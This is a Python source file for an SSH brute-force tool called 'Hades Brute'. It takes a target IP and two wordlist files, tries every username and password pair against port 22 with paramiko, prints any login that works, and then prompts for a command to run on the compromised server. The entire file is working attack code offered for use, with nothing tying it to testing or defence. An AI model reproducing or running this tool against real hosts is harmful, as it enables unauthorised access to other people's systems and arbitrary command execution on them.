import paramiko, time, signal, os, sys, resource
from colorama import *

threads = []

class Utils():
	def Clear():
		os.system('cls' if os.name == 'nt' else 'clear')

	def Quit_Program(sig, frame):
		print("\n"+Fore.LIGHTWHITE_EX+"["+Fore.LIGHTRED_EX+"Hades"+Fore.LIGHTWHITE_EX+"] "+Fore.LIGHTRED_EX+"Exiting AT Request Of User")
		os._exit(0)

	def Read_File(File_Name):
		if os.path.isfile(File_Name):
			f = open(File_Name, "r").read().split('\n')
			return f
		else:
			print(Fore.LIGHTWHITE_EX+"["+Fore.LIGHTRED_EX+"Hades"+Fore.LIGHTWHITE_EX+"] "+Fore.LIGHTRED_EX+"Unable To Locate File: "+ File_Name)
			os._exit(0)

	def Title_Writer(Title):
		print(f'\33]0;{Title}\a', end='', flush=True)

class Hades_Brute():

	def Execute_Command(SSH):
		Hades = True
		while Hades:
			execute = input(Fore.LIGHTWHITE_EX+"Want To Execute A Command? "+Fore.LIGHTWHITE_EX+"("+Fore.LIGHTGREEN_EX+"y"+Fore.LIGHTWHITE_EX+"/"+Fore.LIGHTGREEN_EX+"n"+Fore.LIGHTWHITE_EX+")"+Fore.LIGHTGREEN_EX+": ")
			if execute.lower() == "y":
				command = input(Fore.LIGHTWHITE_EX+"Enter Command To Execute"+Fore.LIGHTGREEN_EX+": ")
				(stdin, stdout, stderr) = SSH.exec_command(command)
				for _ in stdout.readlines():
					print(_)
				Hades = False
			elif execute.lower() == "n":
				Hades = False
			else:
				print(Fore.LIGHTWHITE_EX+"["+Fore.LIGHTRED_EX+"Hades"+Fore.LIGHTWHITE_EX+"] "+Fore.LIGHTRED_EX+"Invalid Option")


	def Brute(IP, Username, Password):
		SSH = paramiko.SSHClient()
		SSH.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		try:
			SSH.connect(IP, port=22, username=Username, password=Password, timeout=15, look_for_keys=False, allow_agent=False, banner_timeout=200)
			print(Fore.LIGHTWHITE_EX+"["+Fore.LIGHTGREEN_EX+"Hades"+Fore.LIGHTWHITE_EX+"] "+Fore.LIGHTGREEN_EX+"Found Login: "+Username+Fore.LIGHTWHITE_EX+":"+Fore.LIGHTGREEN_EX+Password)
			Hades_Brute.Execute_Command(SSH)
			SSH.close()
		except Exception as e:
			print(e)

	def Main():
		if len(sys.argv) <=3 or len(sys.argv) >=5:
			print(Fore.LIGHTWHITE_EX+"["+Fore.LIGHTRED_EX+"Hades"+Fore.LIGHTWHITE_EX+"] "+Fore.LIGHTRED_EX+"Invalid Usage")
			print(Fore.LIGHTWHITE_EX+"["+Fore.LIGHTRED_EX+"Hades"+Fore.LIGHTWHITE_EX+"] "+Fore.LIGHTRED_EX+sys.argv[0] +" <IP> <Username_File> <Password_File>")
			os._exit(0)
		else:
			Count = 0
			print(Fore.LIGHTWHITE_EX+"["+Fore.LIGHTGREEN_EX+"Hades"+Fore.LIGHTWHITE_EX+"] "+Fore.LIGHTGREEN_EX+"Initializing SSH Bruter")
			Utils.Title_Writer("Hades Brute")
			IP = sys.argv[1]
			Username_File = Utils.Read_File(sys.argv[2])
			Password_File = Utils.Read_File(sys.argv[3])
			for u in Username_File:
				for p in Password_File:
					Count += 1
					Hades_Brute.Brute(IP, u, p)

			print(Fore.LIGHTWHITE_EX+"["+Fore.LIGHTGREEN_EX+"Hades"+Fore.LIGHTWHITE_EX+"] "+Fore.LIGHTGREEN_EX+"Finished Trying "+str(Count) + " Combinations")

paramiko.util.log_to_file("/dev/null", level = "INFO")			
signal.signal(signal.SIGINT, Utils.Quit_Program)
Hades_Brute.Main()
